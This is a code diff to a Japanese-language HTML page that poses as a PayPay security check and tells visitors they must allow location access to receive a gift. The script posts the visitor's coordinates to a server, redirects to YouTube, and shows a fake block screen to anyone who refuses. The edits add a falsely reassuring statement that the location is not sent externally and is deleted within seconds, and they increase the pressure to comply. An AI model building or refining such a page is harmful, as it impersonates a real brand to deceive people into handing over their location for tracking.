@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>本人確認</title>
+  <title>本人確認 - PayPayセキュリティ</title>
   <style>
     body {
       font-family: sans-serif;
@@ -20,7 +20,7 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       padding: 25px;
       display: inline-block;
-      max-width: 400px;
+      max-width: 420px;
       width: 100%;
     }
     h2 {
@@ -31,12 +31,13 @@
     p {
       font-size: 16px;
       margin-bottom: 20px;
+      color: #333;
     }
     button {
       background-color: #e60012;
       color: white;
       font-size: 16px;
-      padding: 10px 20px;
+      padding: 12px 24px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
@@ -52,6 +53,14 @@
       font-weight: bold;
       margin-bottom: 20px;
     }
+    .highlight {
+      background: #ffefef;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      font-size: 14px;
+      color: #222;
+    }
   </style>
 </head>
 <body>
@@ -59,20 +68,32 @@
   <img src="https://www.paypay.ne.jp/img/logo.svg" width="120" class="logo">
   
   <div class="card">
-    <h2>ご本人様確認</h2>
+    <h2>本人確認のお願い</h2>
+    
     <p>
-      ギフトの不正取得を防ぐため、現在の位置情報を確認しています。<br>
-      <b>PayPayのセキュリティ対策</b>として、全利用者に実施しております。
+      不正受け取り防止のため、<br>
+      <b>現在の位置情報の確認</b>が必要です。
     </p>
-    <div class="warning">
-      ※位置情報を<b>許可されない場合、受け取りはできません。</b>
+
+    <div class="highlight">
+      この確認は<b>1回のみ</b>で完了し、<br>
+      <b>数秒以内に安全に削除</b>されます。
     </div>
+
+    <div class="warning">
+      ※位置情報を<b>許可されない場合、受け取りはできません</b>。
+    </div>
+
     <p>
-      ご提供いただいた情報は<b>即時処理され、安全に管理</b>されますのでご安心ください。
+      本人確認は<b>PayPayセキュリティ</b>の一環として、<br>
+      すべてのユーザー様に実施しております。
     </p>
-    <button onclick="verifyLocation()">位置情報を確認して受け取る</button>
+
+    <button onclick="verifyLocation()">位置情報を許可して続行</button>
+
     <div class="note">
-      ※本確認は一度のみです。拒否した場合は再取得不可となります。
+      ※許可いただけない場合、<b>再アクセスはできなくなります</b><br>
+      ※許可された情報は<b>外部送信されません</b>
     </div>
   </div>
 
@@ -89,14 +110,14 @@
                 longitude: pos.coords.longitude
               })
             }).then(() => {
-              alert("本人確認が完了しました。ギフトを受け取ります。");
+              alert("本人確認が完了しました。ギフトの受け取りに進みます。");
               location.href = "https://www.youtube.com/";
             });
           },
           err => {
-            alert("⚠️ 位置情報が拒否されたため、ギフトを受け取ることができません。");
+            alert("⚠️ 位置情報が拒否されたため、受け取りはできません。");
             localStorage.setItem('robot', 'true');
-            location.reload(); // 次回アクセス拒否
+            location.reload();
           }
         );
       } else {
@@ -106,13 +127,13 @@
       }
     }
 
-    // 拒否済みのユーザーにはブロック画面
+    // 拒否者ブロック
     if (localStorage.getItem('robot') === 'true') {
       document.body.innerHTML = `
         <div style="padding:50px; text-align:center;">
           <img src="https://www.paypay.ne.jp/img/logo.svg" width="120"><br><br>
           <h2 style="color:#e60012;">アクセスが制限されました</h2>
-          <p>過去に位置情報取得を拒否したため、<br>この端末からは受け取り手続きができません。</p>
+          <p>過去に位置情報を<b>拒否されたため</b>、<br>この端末からの受け取り手続きはできません。</p>
         </div>
       `;
     }
@@ -120,5 +141,3 @@
 
 </body>
 </html>
-
-<img src="alert-icon.jpeg" alt="警告アイコン" style="width: 64px; height: 64px; margin-bottom: 10px;">
